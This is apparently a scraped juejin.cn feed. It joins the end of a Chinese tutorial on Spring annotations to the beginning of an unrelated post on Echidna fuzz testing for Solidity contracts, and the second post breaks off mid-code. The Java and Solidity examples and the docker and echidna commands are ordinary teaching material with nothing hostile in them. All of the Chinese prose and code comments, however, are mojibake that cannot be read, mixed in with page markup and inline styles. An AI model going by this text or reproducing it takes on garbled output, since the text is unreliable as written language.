<p><code>@TransactionalEventListener</code> æ˜¯<code>@EventListener</code>çš„äº‹åŠ¡å¢å¼ºç‰ˆï¼Œæ”¯æŒäº‹åŠ¡ç”Ÿå‘½å‘¨æœŸç»‘å®šã€‚</p>
<ul>
<li>æ ¸å¿ƒç‰¹æ€§ï¼šäº‹ä»¶è§¦å‘æ—¶æœºä¸äº‹åŠ¡çŠ¶æ€å…³è”ï¼ˆå¦‚äº‹åŠ¡æäº¤åã€å›æ»šåï¼‰ï¼Œé¿å…äº‹åŠ¡æœªæäº¤æ—¶è§¦å‘åç»­é€»è¾‘ã€‚</li>
</ul>
<p><strong>å±æ€§è¯´æ˜ï¼š</strong></p>




















<table><thead><tr><th>å±æ€§å</th><th>è¯´æ˜</th><th>è¡¥å……è¯´æ˜</th></tr></thead><tbody><tr><td>phase</td><td>äº‹åŠ¡é˜¶æ®µ</td><td>æšä¸¾å€¼ï¼š<code>BEFORE_COMMIT</code>ï¼ˆæäº¤å‰ï¼‰ã€<code>AFTER_COMMIT</code>ï¼ˆæäº¤åï¼Œé»˜è®¤ï¼‰ã€<code>AFTER_ROLLBACK</code>ï¼ˆå›æ»šåï¼‰ã€<code>AFTER_COMPLETION</code>ï¼ˆå®Œæˆåï¼Œæ— è®ºæäº¤ / å›æ»šï¼‰</td></tr><tr><td>fallbackExecution</td><td>æ— äº‹åŠ¡æ—¶æ˜¯å¦æ‰§è¡Œ</td><td>â‘  <code>true</code>ï¼šæ— äº‹åŠ¡æ—¶ä¹Ÿæ‰§è¡Œï¼›â‘¡ <code>false</code>ï¼ˆé»˜è®¤ï¼‰ï¼šä»…äº‹åŠ¡ä¸­æ‰§è¡Œ</td></tr></tbody></table>
<p><strong>ç¤ºä¾‹</strong>ï¼š</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@Service</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">OrderEventListener</span> {
 Â  <span class="hljs-comment">// äº‹åŠ¡æäº¤åæ‰§è¡Œï¼šç¡®ä¿è®¢å•åˆ›å»ºæˆåŠŸåå†å‘é€é€šçŸ¥</span>
 Â  <span class="hljs-meta">@TransactionalEventListener(
 Â  Â  Â  value = OrderCreatedEvent.class,
 Â  Â  Â  phase = TransactionPhase.AFTER_COMMIT,
 Â  Â  Â  fallbackExecution = false
 Â  )</span>
 Â  <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">sendOrderNotice</span><span class="hljs-params">(OrderCreatedEvent event)</span> {
 Â  Â  Â  <span class="hljs-type">OrderDTO</span> <span class="hljs-variable">orderDTO</span> <span class="hljs-operator">=</span> event.getOrderDTO();
 Â  Â  Â  <span class="hljs-comment">// äº‹åŠ¡æäº¤åæ‰§è¡Œï¼šå‘é€çŸ­ä¿¡/é‚®ä»¶é€šçŸ¥</span>
 Â  Â  Â  noticeService.send(orderDTO.getUserId(), <span class="hljs-string">"æ‚¨çš„è®¢å•å·²åˆ›å»ºæˆåŠŸï¼Œè®¢å•å·ï¼š"</span> + orderDTO.getOrderNo());
 Â  }
}
</code></pre>
<h3 data-id="heading-64">4. ä¾èµ–æ³¨å…¥ç›¸å…³è¡¥å……æ³¨è§£</h3>
<h4 data-id="heading-65">ï¼ˆ1ï¼‰@Resourceï¼ˆJSR-250ï¼‰</h4>
<p><code>@Resource</code> æ˜¯ JSR-250 æ ‡å‡†æ³¨è§£ï¼Œç”¨äºä¾èµ–æ³¨å…¥ï¼Œä¸<code>@Autowired</code>åŠŸèƒ½ç±»ä¼¼ï¼ŒåŒºåˆ«å¦‚ä¸‹ï¼š</p>
<ul>
<li><code>@Autowired</code>ï¼šSpring æä¾›ï¼ŒæŒ‰ç±»å‹æ³¨å…¥ï¼Œéœ€é…åˆ<code>@Qualifier</code>æŒ‡å®šåç§°ï¼›</li>
<li><code>@Resource</code>ï¼šJDK æ ‡å‡†ï¼Œé»˜è®¤æŒ‰åç§°æ³¨å…¥ï¼Œåç§°åŒ¹é…å¤±è´¥åˆ™æŒ‰ç±»å‹æ³¨å…¥ã€‚</li>
</ul>
<p><strong>å±æ€§è¯´æ˜ï¼š</strong></p>

























<table><thead><tr><th>å±æ€§å</th><th>è¯´æ˜</th><th>è¡¥å……è¯´æ˜</th></tr></thead><tbody><tr><td>name</td><td>æ³¨å…¥ Bean çš„åç§°</td><td>å¦‚<code>name = "userService"</code>ï¼Œä¼˜å…ˆæŒ‰åç§°åŒ¹é…</td></tr><tr><td>type</td><td>æ³¨å…¥ Bean çš„ç±»å‹</td><td>å¦‚<code>type = UserService.class</code>ï¼ŒæŒ‰ç±»å‹åŒ¹é…</td></tr><tr><td>lookup</td><td>æŸ¥æ‰¾æ–¹å¼</td><td>ä»…ç”¨äº EJBï¼ŒSpring ä¸­å¾ˆå°‘ä½¿ç”¨</td></tr></tbody></table>
<p><strong>ç¤ºä¾‹</strong>ï¼š</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@Service</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">OrderService</span> {
 Â  <span class="hljs-comment">// æŒ‰åç§°æ³¨å…¥ï¼ˆBeanåç§°ä¸ºuserServiceï¼‰</span>
 Â  <span class="hljs-meta">@Resource(name = "userService")</span>
 Â  <span class="hljs-keyword">private</span> UserService userService;
 Â  <span class="hljs-comment">// æŒ‰ç±»å‹æ³¨å…¥ï¼ˆä»…å½“å­˜åœ¨å”¯ä¸€UserMapperç±»å‹Beanæ—¶ç”Ÿæ•ˆï¼‰</span>
 Â  <span class="hljs-meta">@Resource(type = UserMapper.class)</span>
 Â  <span class="hljs-keyword">private</span> UserMapper userMapper;
 Â  <span class="hljs-comment">// æ— å±æ€§ï¼šé»˜è®¤æŒ‰å­—æ®µåï¼ˆorderMapperï¼‰åŒ¹é…Beanåç§°</span>
 Â  <span class="hljs-meta">@Resource</span>
 Â  <span class="hljs-keyword">private</span> OrderMapper orderMapper;
}
</code></pre>
<h4 data-id="heading-66">ï¼ˆ2ï¼‰@Injectï¼ˆJSR-330ï¼‰</h4>
<p><code>@Inject</code> æ˜¯ JSR-330 æ ‡å‡†æ³¨è§£ï¼Œç”¨äºä¾èµ–æ³¨å…¥ï¼ŒåŠŸèƒ½ä¸<code>@Autowired</code>ç±»ä¼¼ï¼Œéœ€å¼•å…¥<code>javax.inject</code>ä¾èµ–ã€‚</p>
<ul>
<li>ç‰¹ç‚¹ï¼šæ— å±æ€§ï¼Œä»…æŒ‰ç±»å‹æ³¨å…¥ï¼Œéœ€é…åˆ<code>@Named</code>æŒ‡å®š Bean åç§°ã€‚</li>
</ul>
<p><strong>ç¤ºä¾‹</strong>ï¼š</p>
<pre><code class="hljs language-xml" lang="xml"><span class="hljs-comment">&lt;!-- å¼•å…¥ä¾èµ–ï¼ˆMavenï¼‰ --&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>
 Â  <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>javax.inject<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>
 Â  <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>javax.inject<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>
 Â  <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>1<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span>
</code></pre>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@Service</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ProductService</span> {
 Â  <span class="hljs-comment">// æŒ‰ç±»å‹æ³¨å…¥</span>
 Â  <span class="hljs-meta">@Inject</span>
 Â  <span class="hljs-keyword">private</span> ProductMapper productMapper;
 Â  <span class="hljs-comment">// æŒ‰åç§°æ³¨å…¥ï¼ˆé…åˆ@Namedï¼‰</span>
 Â  <span class="hljs-meta">@Inject</span>
 Â  <span class="hljs-meta">@Named("userService")</span>
 Â  <span class="hljs-keyword">private</span> UserService userService;
}
</code></pre>
<h2 data-id="heading-67">ä¸ƒã€æ³¨è§£ä½¿ç”¨æ³¨æ„äº‹é¡¹æ€»ç»“</h2>
<ol>
<li><strong>ä»£ç†å¤±æ•ˆé—®é¢˜</strong>ï¼š</li>
</ol>
<ul>
<li><code>@Transactional</code>ã€<code>@Async</code>ã€<code>@Cacheable</code>ç­‰æ³¨è§£ä¾èµ– Spring AOP ä»£ç†ï¼ŒåŒä¸€ç±»ä¸­æ–¹æ³•è°ƒç”¨ä¼šå¯¼è‡´ä»£ç†å¤±æ•ˆï¼›</li>
<li>è§£å†³æ–¹æ¡ˆï¼šé€šè¿‡<code>ApplicationContext</code>è·å– Bean è°ƒç”¨ï¼Œæˆ–æ‹†åˆ†ä¸šåŠ¡é€»è¾‘åˆ°ä¸åŒç±»ã€‚</li>
</ul>
<ol start="2">
<li><strong>äº‹åŠ¡ç›¸å…³æ³¨æ„</strong>ï¼š</li>
</ol>
<ul>
<li><code>@Transactional</code>é»˜è®¤ä»…å›æ»š<code>RuntimeException</code>ï¼Œæ£€æŸ¥å‹å¼‚å¸¸ï¼ˆå¦‚<code>SQLException</code>ï¼‰éœ€é€šè¿‡<code>rollbackFor</code>æŒ‡å®šï¼›</li>
<li>å¤šæ•°æ®æºåœºæ™¯éœ€é€šè¿‡<code>transactionManager</code>å±æ€§æŒ‡å®šå¯¹åº”çš„äº‹åŠ¡ç®¡ç†å™¨ã€‚</li>
</ul>
<ol start="3">
<li><strong>ç¼“å­˜ç›¸å…³æ³¨æ„</strong>ï¼š</li>
</ol>
<ul>
<li><code>@Cacheable</code>çš„<code>key</code>éœ€ä½¿ç”¨ SpEL è¡¨è¾¾å¼ï¼ˆå¦‚<code>#id</code>ï¼‰ï¼Œé¿å…ç¡¬ç¼–ç ï¼›</li>
<li>ç¼“å­˜å¯¹è±¡éœ€å®ç°åºåˆ—åŒ–ï¼ˆå¦‚ Redis ç¼“å­˜æ—¶ï¼‰ï¼Œå¦åˆ™ä¼šæŠ›å‡ºåºåˆ—åŒ–å¼‚å¸¸ã€‚</li>
</ul>
<ol start="4">
<li><strong>æƒé™æ³¨è§£æ³¨æ„</strong>ï¼š</li>
</ol>
<ul>
<li>Spring Security 6 + æ¨èä½¿ç”¨<code>@EnableMethodSecurity</code>æ›¿ä»£æ—§ç‰ˆ<code>@EnableGlobalMethodSecurity</code>ï¼›</li>
<li><code>@Secured</code>æ³¨è§£çš„è§’è‰²åç§°é»˜è®¤éœ€å¸¦<code>ROLE_</code>å‰ç¼€ï¼Œå¯é€šè¿‡é…ç½®<code>rolePrefix = ""</code>å–æ¶ˆå‰ç¼€ã€‚</li>
</ul>
<ol start="5">
<li><strong>ä¾èµ–æ³¨å…¥é€‰æ‹©</strong>ï¼š</li>
</ol>
<ul>
<li>ä¼˜å…ˆä½¿ç”¨<code>@Autowired</code>ï¼ˆSpring åŸç”Ÿï¼Œæ”¯æŒæ›´å¤šç‰¹æ€§ï¼‰ï¼›</li>
<li>è·¨æ¡†æ¶å…¼å®¹åœºæ™¯å¯ä½¿ç”¨<code>@Resource</code>ï¼ˆJSR-250ï¼‰æˆ–<code>@Inject</code>ï¼ˆJSR-330ï¼‰ã€‚</li>
</ul>
<p>é€šè¿‡æœ¬æ–‡æ•´ç†çš„ Spring æ ¸å¿ƒæ³¨è§£ï¼Œå¯è¦†ç›–å¤§å¤šæ•°å¼€å‘åœºæ™¯ï¼Œåˆç†ä½¿ç”¨æ³¨è§£èƒ½å¤§å¹…ç®€åŒ–é…ç½®ã€è§£è€¦ä¸šåŠ¡é€»è¾‘ï¼Œæå‡å¼€å‘æ•ˆç‡ã€‚å®é™…å¼€å‘ä¸­éœ€ç»“åˆå…·ä½“åœºæ™¯é€‰æ‹©åˆé€‚çš„æ³¨è§£ï¼Œå¹¶æ³¨æ„é¿å…å¸¸è§é™·é˜±ï¼ˆå¦‚ä»£ç†å¤±æ•ˆã€äº‹åŠ¡å›æ»šå¼‚å¸¸ç­‰ï¼‰ã€‚</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[3åˆ†é’ŸSolidity: 13.1 Echidnaæµ‹è¯•æ¡†æ¶]]></title>    <link>https://juejin.cn/post/7596905015367417856</link>    <guid>https://juejin.cn/post/7596905015367417856</guid>    <pubDate>2026-01-19T23:13:12.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7596905015367417856" data-draft-id="7596906473306456114" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="3åˆ†é’ŸSolidity: 13.1 Echidnaæµ‹è¯•æ¡†æ¶"/> <meta itemprop="keywords" content="Solidity,web3,æ™ºèƒ½åˆçº¦"/> <meta itemprop="datePublished" content="2026-01-19T23:13:12.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="Rockbean"/> <meta itemprop="url" content="https://juejin.cn/user/4054654615823560"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            3åˆ†é’ŸSolidity: 13.1 Echidnaæµ‹è¯•æ¡†æ¶
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/4054654615823560/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    Rockbean
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-19T23:13:12.000Z" title="Mon Jan 19 2026 23:13:12 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-19
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    1
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»1åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p><strong>æ¬¢è¿è®¢é˜…ä¸“æ </strong>ï¼š<a href="https://juejin.cn/column/7578762210285977663" title="https://juejin.cn/column/7578762210285977663" target="_blank">3åˆ†é’ŸSolidity--æ™ºèƒ½åˆçº¦--Web3åŒºå—é“¾æŠ€æœ¯å¿…å­¦</a></p>
<h2 data-id="heading-0">Echidna</h2>
<p>è¦è·å–æ­¤å†…å®¹çš„æœ€æ–°ç‰ˆæœ¬ï¼Œè¯·è®¿é—® Cyfrin.io ä¸Šçš„Â <a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.cyfrin.io%2Fglossary%2Fechidna-fuzz-testing-solidity-code-example" target="_blank" title="https://www.cyfrin.io/glossary/echidna-fuzz-testing-solidity-code-example" ref="nofollow noopener noreferrer">Echidnaï¼ˆä»£ç ç¤ºä¾‹ï¼‰</a></p>
<p><strong>Echidnaæ˜¯ä¸€ä¸ªå¿«é€Ÿçš„æ™ºèƒ½åˆçº¦ï¼ˆsolidityï¼‰æ¨¡ç³Šæµ‹è¯•æ¡†æ¶</strong>ï¼Œå®ƒæ˜¯ç”¨Haskellè¯­è¨€ç¼–å†™çš„ç¨‹åºï¼Œå®ç°åŸºäºä»¥å¤ªåŠæ™ºèƒ½åˆçº¦å±æ€§çš„æ¨¡ç³Šæµ‹è¯•ã€‚Â å®ƒä½¿ç”¨åŸºäºåˆçº¦ABIçš„å¤æ‚çš„grammar-basedæ¨¡ç³Šæµ‹è¯•æ¥éªŒè¯ç”¨æˆ·å®šä¹‰æ–­è¨€æˆ–è€…Solidityæ–­è¨€ã€‚Â Echidnaåœ¨è®¾è®¡æ—¶è€ƒè™‘äº†æ¨¡å—åŒ–ï¼Œå¯ä»¥å¾ˆå®¹æ˜“åœ°è¢«æ‰©å±•æˆåŒ…å«æ–°çš„å˜ç§æˆ–è€…åœ¨ç‰¹å®šæƒ…å†µä¸‹ï¼Œæµ‹è¯•ç‰¹å®šåˆçº¦ã€‚</p>
<p>ä½¿ç”¨Â <a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fcrytic%2Fechidna" target="_blank" title="https://github.com/crytic/echidna" ref="nofollow noopener noreferrer">Echidna</a>è¿›è¡Œæ¨¡ç³Šæµ‹è¯•çš„ç¤ºä¾‹ã€‚</p>
<ol>
<li>å°† Solidity åˆçº¦ä¿å­˜ä¸ºÂ <code>TestEchidna.sol</code></li>
<li>åœ¨å­˜å‚¨åˆçº¦çš„æ–‡ä»¶å¤¹ä¸­æ‰§è¡Œä»¥ä¸‹å‘½ä»¤ã€‚</li>
</ol>
<pre><code class="hljs language-bash" lang="bash">docker run -it --<span class="hljs-built_in">rm</span> -v <span class="hljs-variable">$PWD</span>:/code trailofbits/eth-security-toolbox
</code></pre>
<p>åœ¨ Docker ä¸­ï¼Œæ‚¨çš„ä»£ç å°†å­˜å‚¨åœ¨æ ¹ç›®å½•ä¸‹çš„Â <code>/code</code>æ–‡ä»¶å¤¹ä¸­ã€‚</p>
<ol start="3">
<li>æŸ¥çœ‹ä»¥ä¸‹æ³¨é‡Šå¹¶æ‰§è¡ŒÂ <code>echidna</code>å‘½ä»¤ã€‚</li>
</ol>
<pre><code class="hljs language-php" lang="php"><span class="hljs-comment">// SPDX-License-Identifier: MIT</span>
pragma solidity ^<span class="hljs-number">0.8</span>.<span class="hljs-number">26</span>;

<span class="hljs-comment">/*
echidna TestEchidna.sol --contract TestCounter
*/</span>
contract Counter {
    uint256 <span class="hljs-keyword">public</span> count;

    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">inc</span>(<span class="hljs-params"/>) <span class="hljs-title">external</span> </span>{
        count += <span class="hljs-number">1</span>;
    }

    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">dec</span>(<span class="hljs-params"/>) <span class="hljs-title">external</span> </span>{
        count -= <span class="hljs-number">1</span>;
    }
}

contract TestCounter is Counter {
    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">echidna_test_true</span>(<span class="hljs-params"/>) <span class="hljs-title">public</span> <span class="hljs-title">view</span> <span class="hljs-title">returns</span> (<span class="hljs-params"><span class="hljs-keyword">bool</span></span>) </span>{
        <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;
    }

    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">echidna_test_false</span>(<span class="hljs-params"/>) <span class="hljs-title">public</span> <span class="hljs-title">view</span> <span class="hljs-title">returns</span> (<span class="hljs-params"><span class="hljs-keyword">bool</span></span>) </span>{
        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;
    }

    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">echidna_test_count</span>(<span class="hljs-params"/>) <span class="hljs-title">public</span> <span class="hljs-title">view</span> <span class="hljs-title">returns</span> (<span class="hljs-params"><span class="hljs-keyword">bool</span></span>) </span>{
        <span class="hljs-comment">// è¿™é‡Œæˆ‘ä»¬åœ¨æµ‹è¯•Counter.countåº”è¯¥å§‹ç»ˆ&lt;=5ã€‚</span>
        <span class="hljs-comment">// æµ‹è¯•å°†å¤±è´¥ã€‚Echidnaè¶³å¤Ÿèªæ˜ï¼Œä¼šè°ƒç”¨Counter.inc()</span>
        <span class="hljs-comment">// è¶…è¿‡5æ¬¡ã€‚</span>
        <span class="hljs-keyword">return</span> count &lt;= <span class="hljs-number">5</span>;
    }
}

<span class="hljs-comment">/*
echidna TestEchidna.sol --contract TestAssert --test-mode assertion
*/</span>
contract TestAssert {
    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">test_assert</span>(<span class="hljs-params">uint256 _i</span>) <span class="hljs-title">external</span> </span>{
        <span class="hljs-title function_ invoke__">assert</span>(_i &lt; <span class="hljs-number">10</span>);
    }

    <span class="hljs-comment">// æ›´å¤æ‚çš„ä¾‹å­</span>
    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">abs</span>(<span class="hljs-params">uint256 x, uint256 y</span>) <span class="hljs-title">private</span> <span class="hljs-title">pure</span> <span class="hljs-title">returns</span> (<span class="hljs-params">uint256</span>) </span>{
        <span class="hljs-keyword">if</span> (x &gt;= y) {
            <span class="hljs-keyword">return</span> x - y;
        }
        <span class="hljs-keyword">return</span> y - x;
    }

    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">test_abs</span>(<span class="hljs-params">uint256 x, uint256 y</span>) <span class="hljs-title">external</span> </span>{
        uint256 z = <span class="hljs-title function_ invoke__">abs</span>(x, y);
        <span class="hljs-keyword">if</span> (x &gt;= y) {
            <span class="hljs-title function_ invoke__">assert</span>(z &lt;= x);
        } <span class="hljs-keyword">else</span> {
            <span class="hljs-title function_ invoke__">assert</span>(z &lt;= y);
        }
    }
}
</code></pre>
<h3 data-id="heading-1">æµ‹è¯•æ—¶é—´ä¸å‘é€è€…</h3>
<p>Echidnaå¯ä»¥å¯¹æ—¶é—´æˆ³è¿›è¡Œæ¨¡ç³Šæµ‹è¯•ã€‚æ—¶é—´æˆ³èŒƒå›´å¯åœ¨é…ç½®ä¸­è®¾ç½®ï¼Œé»˜è®¤ä¸º7å¤©ã€‚</p>
<p>åˆçº¦è°ƒç”¨è€…åŒæ ·å¯åœ¨é…ç½®ä¸­è®¾ç½®ã€‚é»˜è®¤è´¦æˆ·ä¸ºï¼š</p>
<ul>
<li><code>0x10000</code></li>
<li><code>0x20000</code></li>
<li><code>0x30000</code></li>
</ul>
<pre><code class="hljs language-ini" lang="ini">// SPDX-License-Identifier: MIT
pragma solidity ^0.8.26<span class="hljs-comment">;</span>

/*
docker run -it --rm -v $PWD:/code trailofbits/eth-security-toolbox
echidna EchidnaTestTimeAndCaller.sol --contract EchidnaTestTimeAndCaller
*/
contract EchidnaTestTimeAndCaller {
    bool private <span class="hljs-attr">pass</span> = <span class="hljs-literal">true</span><span class="hljs-comment">;</span>
    uint256 private <span class="hljs-attr">createdAt</span> = block.timestamp<span class="hljs-comment">;</span>

    /*
    å¦‚æœEchidnaèƒ½å¤Ÿè°ƒç”¨setFail()ï¼Œæµ‹è¯•å°†å¤±è´¥
    å¦åˆ™æµ‹è¯•å°†é€šè¿‡
    */
    function echidna_test_pass() public view returns (bool) {
        return pass<span class="hljs-comment">;</span>
    }

    function setFail() external {
        /*
        å¦‚æœå»¶è¿Ÿå°äºç­‰äºæœ€å¤§åŒºå—å»¶è¿Ÿï¼ŒEchidnaå¯ä»¥è°ƒç”¨æ­¤å‡½æ•°ã€‚
        å¦åˆ™ï¼ŒEchidnaå°†æ— æ³•è°ƒç”¨æ­¤å‡½æ•°ã€‚
        æœ€å¤§åŒºå—å»¶è¿Ÿå¯ä»¥é€šè¿‡åœ¨é…ç½®æ–‡ä»¶ä¸­æŒ‡å®šæ¥å»¶é•¿ã€‚
        */
        uint256 <span class="hljs-attr">delay</span> = <span class="hljs-number">7</span> days<span class="hljs-comment">;</span>
        require(block.timestamp &gt;= createdAt + delay)<span class="hljs-comment">;</span>
        <span class="hljs-attr">pass</span> = <span class="hljs-literal">false</span><span class="hljs-comment">;</span>
    }

    // é»˜è®¤sender
    // æ›´æ”¹åœ°å€ä»¥æŸ¥çœ‹æµ‹è¯•å¤±è´¥
    address<span class="hljs-section">[3]</span> private <span class="hljs-attr">senders</span> =
        <span class="hljs-section">[address(0x10000), address(0x20000), address(0x30000)]</span><span class="hljs-comment">;</span>

    address private <span class="hljs-attr">sender</span> = msg.sender<span class="hljs-comment">;</span>

    // å°† _sender ä½œä¸ºè¾“å…¥ï¼Œå¹¶è¦æ±‚ <span class="hljs-attr">msg.sender</span> == _sender
    // ä»¥ _sender ä¸ºä¾‹è¿›è¡Œåè¯
    function setSender(address _sender) external {
        require(<span class="hljs-attr">_sender</span> == msg.sender)<span class="hljs-comment">;</span>
        <span class="hljs-attr">sender</span> = msg.sender<span class="hljs-comment">;</span>
    }

